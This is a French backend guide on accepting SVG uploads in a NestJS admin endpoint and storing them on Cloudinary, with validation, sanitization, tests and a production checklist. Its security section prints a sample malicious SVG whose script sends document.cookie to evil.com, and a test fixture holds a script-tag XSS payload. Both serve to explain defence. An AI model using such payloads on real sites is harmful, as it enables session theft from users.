# Guide Backend - Upload SVG pour le Contenu Page d'Accueil

## 📋 Vue d'ensemble

Ce guide explique comment gérer correctement l'upload de fichiers **SVG** pour le contenu de la page d'accueil (Designs Exclusifs, Influenceurs, Merchandising).

Les SVG nécessitent un traitement spécial car :
- Type MIME variable : `image/svg+xml`, `text/xml`, `text/plain`
- Sécurité : risque d'injection XSS si non nettoyé
- Format vectoriel : pas de redimensionnement comme les images raster

---

## 🔍 Problèmes actuels à résoudre

### 1. Détection des fichiers SVG

Les navigateurs peuvent envoyer différents MIME types pour les SVG :

```typescript
// ❌ Détection incomplète
if (file.mimetype !== 'image/svg+xml') {
  throw new BadRequestException('Type non supporté');
}

// ✅ Détection robuste
const isSvg = file.originalname.toLowerCase().endsWith('.svg') ||
              file.mimetype === 'image/svg+xml' ||
              file.mimetype === 'text/xml' ||
              (file.mimetype === 'text/plain' && file.originalname.endsWith('.svg'));
```

### 2. Upload vers Cloudinary

Cloudinary supporte nativement les SVG mais nécessite une configuration spéciale.

---

## 🚀 Implémentation Backend (NestJS)

### Endpoint : `POST /admin/content/upload`

**Route actuelle :**
```typescript
@Post('upload')
@UseGuards(JwtAuthGuard, RolesGuard)
@Roles('ADMIN', 'SUPERADMIN')
@UseInterceptors(FileInterceptor('file'))
async uploadImage(
  @UploadedFile() file: Express.Multer.File,
  @Query('section') section: string
): Promise<{ success: boolean; data: { url: string; publicId: string } }> {
  // ... implémentation
}
```

### Étape 1 : Validation du fichier

```typescript
// src/admin/content/content.controller.ts

import { FileInterceptor } from '@nestjs/platform-express';
import { UploadedFile } from '@nestjs/common';
import * as multer from 'multer';

@Post('upload')
@UseGuards(JwtAuthGuard, RolesGuard)
@Roles('ADMIN', 'SUPERADMIN')
@UseInterceptors(
  FileInterceptor('file', {
    limits: {
      fileSize: 5 * 1024 * 1024, // 5 MB max
    },
    fileFilter: (req, file, cb) => {
      // Autoriser les images raster classiques
      const allowedMimeTypes = [
        'image/jpeg',
        'image/jpg',
        'image/png',
        'image/webp',
        'image/svg+xml',
        'text/xml', // Certains navigateurs envoient text/xml pour les SVG
      ];

      // Vérifier le MIME type
      const isValidMimeType = allowedMimeTypes.includes(file.mimetype);

      // Vérifier l'extension pour les SVG avec MIME type text/plain
      const isSvgByExtension = file.originalname.toLowerCase().endsWith('.svg');

      if (isValidMimeType || isSvgByExtension) {
        cb(null, true);
      } else {
        cb(new BadRequestException('Format non supporté. Utilisez JPG, PNG, WEBP ou SVG'), false);
      }
    },
  })
)
async uploadImage(
  @UploadedFile() file: Express.Multer.File,
  @Query('section') section: 'designs' | 'influencers' | 'merchandising'
): Promise<{ success: boolean; data: { url: string; publicId: string } }> {
  // Validation de la section
  if (!['designs', 'influencers', 'merchandising'].includes(section)) {
    throw new BadRequestException('Section invalide');
  }

  // Vérifier que le fichier existe
  if (!file) {
    throw new BadRequestException('Aucun fichier uploadé');
  }

  // Détection améliorée des SVG
  const isSvg = this.isSvgFile(file);

  console.log('📤 Upload de fichier:', {
    originalName: file.originalname,
    mimeType: file.mimetype,
    size: file.size,
    isSvg,
    section
  });

  try {
    // Upload vers Cloudinary avec configuration adaptée
    const result = await this.uploadToCloudinary(file, section, isSvg);

    return {
      success: true,
      data: {
        url: result.secure_url,
        publicId: result.public_id
      }
    };
  } catch (error) {
    console.error('❌ Erreur upload Cloudinary:', error);
    throw new InternalServerErrorException('Erreur lors de l\'upload de l\'image');
  }
}

/**
 * Détecte si un fichier est un SVG
 */
private isSvgFile(file: Express.Multer.File): boolean {
  const isSvgByExtension = file.originalname.toLowerCase().endsWith('.svg');
  const isSvgByMimeType =
    file.mimetype === 'image/svg+xml' ||
    file.mimetype === 'text/xml' ||
    (file.mimetype === 'text/plain' && file.originalname.endsWith('.svg'));

  return isSvgByExtension || isSvgByMimeType;
}
```

### Étape 2 : Upload vers Cloudinary

```typescript
// src/admin/content/content.service.ts

import { v2 as cloudinary } from 'cloudinary';
import { Readable } from 'stream';

/**
 * Upload un fichier vers Cloudinary avec configuration adaptée
 */
async uploadToCloudinary(
  file: Express.Multer.File,
  section: string,
  isSvg: boolean
): Promise<any> {
  return new Promise((resolve, reject) => {
    // Configuration de l'upload selon le type de fichier
    const uploadOptions: any = {
      folder: `homepage-content/${section}`,
      resource_type: 'image',
      allowed_formats: isSvg ? ['svg'] : ['jpg', 'jpeg', 'png', 'webp'],
    };

    // Pour les SVG, configuration spéciale
    if (isSvg) {
      uploadOptions.format = 'svg';
      uploadOptions.invalidate = true; // Invalider le cache CDN
      uploadOptions.unique_filename = true;
    } else {
      // Pour les images raster, optimisation automatique
      uploadOptions.transformation = [
        { quality: 'auto:good' },
        { fetch_format: 'auto' }
      ];
    }

    // Créer un stream depuis le buffer
    const uploadStream = cloudinary.uploader.upload_stream(
      uploadOptions,
      (error, result) => {
        if (error) {
          console.error('❌ Erreur Cloudinary:', error);
          reject(error);
        } else {
          console.log('✅ Upload Cloudinary réussi:', {
            url: result.secure_url,
            publicId: result.public_id,
            format: result.format
          });
          resolve(result);
        }
      }
    );

    // Envoyer le buffer vers le stream
    const bufferStream = Readable.from(file.buffer);
    bufferStream.pipe(uploadStream);
  });
}
```

### Étape 3 : Nettoyage des SVG (Sécurité)

**⚠️ IMPORTANT : Les SVG peuvent contenir du JavaScript malveillant**

Installer la bibliothèque de nettoyage :

```bash
npm install sanitize-svg
```

Utilisation :

```typescript
import sanitizeSvg from 'sanitize-svg';

/**
 * Nettoie un SVG pour supprimer les scripts malveillants
 */
private async sanitizeSvgFile(file: Express.Multer.File): Promise<Buffer> {
  const svgContent = file.buffer.toString('utf-8');

  // Nettoyer le SVG
  const sanitized = sanitizeSvg(svgContent, {
    allowedTags: [
      'svg', 'path', 'rect', 'circle', 'ellipse', 'line', 'polyline', 'polygon',
      'g', 'defs', 'clipPath', 'mask', 'pattern', 'linearGradient', 'radialGradient',
      'stop', 'text', 'tspan', 'use', 'symbol'
    ],
    allowedAttributes: {
      '*': ['id', 'class', 'style', 'transform', 'fill', 'stroke', 'stroke-width'],
      'svg': ['xmlns', 'viewBox', 'width', 'height', 'preserveAspectRatio'],
      'use': ['href', 'xlink:href']
    }
  });

  return Buffer.from(sanitized, 'utf-8');
}

// Utilisation dans uploadToCloudinary
async uploadToCloudinary(file: Express.Multer.File, section: string, isSvg: boolean): Promise<any> {
  // Si SVG, nettoyer d'abord
  if (isSvg) {
    const sanitizedBuffer = await this.sanitizeSvgFile(file);
    file.buffer = sanitizedBuffer;
  }

  // ... reste de la logique d'upload
}
```

### Étape 4 : Configuration Cloudinary

Dans votre `.env` :

```env
CLOUDINARY_CLOUD_NAME=your_cloud_name
CLOUDINARY_API_KEY=your_api_key
CLOUDINARY_API_SECRET=your_api_secret
```

Configuration dans `main.ts` ou module Cloudinary :

```typescript
import { v2 as cloudinary } from 'cloudinary';

cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
  secure: true
});
```

---

## 📝 Réponse API complète

### Succès

```json
{
  "success": true,
  "data": {
    "url": "https://res.cloudinary.com/printalma/image/upload/v1234567890/homepage-content/designs/logo.svg",
    "publicId": "homepage-content/designs/logo"
  }
}
```

### Erreurs possibles

#### Fichier trop volumineux (413)

```json
{
  "statusCode": 413,
  "message": "Fichier trop volumineux (max 5MB)",
  "error": "Payload Too Large"
}
```

#### Format non supporté (415)

```json
{
  "statusCode": 415,
  "message": "Format non supporté. Utilisez JPG, PNG, WEBP ou SVG",
  "error": "Unsupported Media Type"
}
```

#### Erreur Cloudinary (500)

```json
{
  "statusCode": 500,
  "message": "Erreur lors de l'upload de l'image",
  "error": "Internal Server Error"
}
```

---

## 🔐 Sécurité des SVG

### Vérifications à effectuer

1. **Nettoyage du contenu** : Supprimer les balises `<script>`, `<iframe>`, événements JavaScript
2. **Validation du contenu** : Vérifier que c'est bien du XML valide
3. **Limitation de taille** : Max 5MB pour éviter les DoS
4. **Stockage sécurisé** : Cloudinary avec `secure_url` (HTTPS)

### Exemple de SVG malveillant à bloquer

```svg
<!-- ❌ SVG MALVEILLANT - À BLOQUER -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    alert('XSS Attack!');
    fetch('https://evil.com/steal?cookie=' + document.cookie);
  </script>
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>
```

Après nettoyage :

```svg
<!-- ✅ SVG NETTOYÉ - SÉCURISÉ -->
<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>
```

---

## 🧪 Tests

### Test manuel avec cURL

```bash
# Upload d'un SVG
curl -X POST http://localhost:3004/admin/content/upload?section=designs \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -F "file=@logo.svg"
```

### Tests unitaires

```typescript
// src/admin/content/content.controller.spec.ts

describe('ContentController - Upload', () => {
  it('should upload SVG file', async () => {
    const svgBuffer = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="40"/></svg>',
      'utf-8'
    );

    const file: Express.Multer.File = {
      fieldname: 'file',
      originalname: 'logo.svg',
      encoding: '7bit',
      mimetype: 'image/svg+xml',
      buffer: svgBuffer,
      size: svgBuffer.length,
    } as any;

    const result = await controller.uploadImage(file, 'designs');

    expect(result.success).toBe(true);
    expect(result.data.url).toContain('.svg');
  });

  it('should reject SVG with script tag', async () => {
    const maliciousSvg = Buffer.from(
      '<svg><script>alert("XSS")</script><circle/></svg>',
      'utf-8'
    );

    const file: Express.Multer.File = {
      originalname: 'malicious.svg',
      mimetype: 'image/svg+xml',
      buffer: maliciousSvg,
      size: maliciousSvg.length,
    } as any;

    // Le SVG devrait être nettoyé automatiquement
    const result = await controller.uploadImage(file, 'designs');

    // Vérifier que le script a été supprimé
    expect(result.data.url).toBeDefined();
    // Le contenu uploadé ne devrait plus contenir <script>
  });

  it('should reject file too large', async () => {
    const largeBuffer = Buffer.alloc(6 * 1024 * 1024); // 6 MB

    const file: Express.Multer.File = {
      originalname: 'large.svg',
      mimetype: 'image/svg+xml',
      buffer: largeBuffer,
      size: largeBuffer.length,
    } as any;

    await expect(
      controller.uploadImage(file, 'designs')
    ).rejects.toThrow('Fichier trop volumineux');
  });
});
```

---

## 📊 Logs recommandés

```typescript
// Logging détaillé pour debug
console.log('📤 Upload de fichier:', {
  originalName: file.originalname,
  mimeType: file.mimetype,
  size: `${(file.size / 1024).toFixed(2)} KB`,
  isSvg,
  section
});

// Après upload Cloudinary
console.log('✅ Upload réussi:', {
  url: result.secure_url,
  publicId: result.public_id,
  format: result.format,
  bytes: result.bytes,
  width: result.width,
  height: result.height
});
```

---

## 🔄 Workflow complet

```
1. Frontend : Utilisateur sélectionne un fichier SVG
   ↓
2. Frontend : Validation côté client (taille, extension)
   ↓
3. Frontend : Upload vers POST /admin/content/upload?section=designs
   ↓
4. Backend : Validation du fichier (MIME type, taille)
   ↓
5. Backend : Détection automatique SVG
   ↓
6. Backend : Nettoyage du SVG (suppression scripts)
   ↓
7. Backend : Upload vers Cloudinary avec options SVG
   ↓
8. Backend : Retour de l'URL sécurisée (HTTPS)
   ↓
9. Frontend : Mise à jour de l'UI avec la nouvelle URL
   ↓
10. Frontend : Affichage du SVG avec object-fit: contain
```

---

## 📚 Dépendances requises

```json
{
  "dependencies": {
    "cloudinary": "^1.41.0",
    "sanitize-svg": "^1.0.4",
    "multer": "^1.4.5-lts.1"
  },
  "devDependencies": {
    "@types/multer": "^1.4.11"
  }
}
```

Installation :

```bash
npm install cloudinary sanitize-svg multer
npm install --save-dev @types/multer
```

---

## ⚡ Optimisations possibles

### 1. Cache CDN

```typescript
uploadOptions.invalidate = true; // Invalider le cache immédiatement
uploadOptions.eager = [
  { width: 400, crop: 'limit', format: 'svg' }
];
```

### 2. Compression SVG

```bash
npm install svgo
```

```typescript
import { optimize } from 'svgo';

const optimizedSvg = optimize(svgContent, {
  plugins: [
    'removeDoctype',
    'removeXMLProcInst',
    'removeComments',
    'removeMetadata',
    'removeEditorsNSData',
    'cleanupAttrs',
    'mergeStyles',
    'inlineStyles',
    'minifyStyles',
    'cleanupIDs',
    'removeUselessDefs',
    'cleanupNumericValues',
    'convertColors',
    'removeUnknownsAndDefaults',
    'removeNonInheritableGroupAttrs',
    'removeUselessStrokeAndFill',
    'removeViewBox',
    'cleanupEnableBackground',
    'removeHiddenElems',
    'removeEmptyText',
    'convertShapeToPath',
    'convertEllipseToCircle',
    'moveElemsAttrsToGroup',
    'moveGroupAttrsToElems',
    'collapseGroups',
    'convertPathData',
    'convertTransform',
    'removeEmptyAttrs',
    'removeEmptyContainers',
    'mergePaths',
    'removeUnusedNS',
    'sortDefsChildren',
    'removeTitle',
    'removeDesc'
  ]
});

file.buffer = Buffer.from(optimizedSvg.data, 'utf-8');
```

---

## 🐛 Problèmes connus et solutions

### Problème 1 : MIME type `text/plain` pour SVG

**Symptôme :** Certains navigateurs envoient `text/plain` pour les fichiers `.svg`

**Solution :** Vérifier aussi l'extension du fichier

```typescript
const isSvg = file.originalname.toLowerCase().endsWith('.svg') ||
              file.mimetype === 'image/svg+xml';
```

### Problème 2 : SVG ne s'affiche pas après upload

**Symptôme :** L'URL Cloudinary est retournée mais le SVG ne s'affiche pas

**Solution :** Vérifier le Content-Type servi par Cloudinary

```typescript
// Forcer le format SVG dans l'upload
uploadOptions.format = 'svg';
uploadOptions.resource_type = 'image';
```

### Problème 3 : CORS avec Cloudinary

**Symptôme :** Erreur CORS lors du chargement du SVG

**Solution :** Configurer les headers CORS dans Cloudinary Dashboard

---

## 📋 Checklist de mise en production

- [ ] Validation des MIME types pour SVG (image/svg+xml, text/xml, text/plain)
- [ ] Nettoyage des SVG avec sanitize-svg
- [ ] Limitation de taille (5MB max)
- [ ] Upload vers Cloudinary avec configuration SVG
- [ ] Tests unitaires pour upload SVG
- [ ] Tests de sécurité (SVG malveillants)
- [ ] Logs détaillés pour debug
- [ ] Gestion des erreurs complète
- [ ] Documentation API à jour

---

**Version :** 1.0.0
**Date :** 2026-02-06
**Auteur :** Équipe Backend PrintAlma
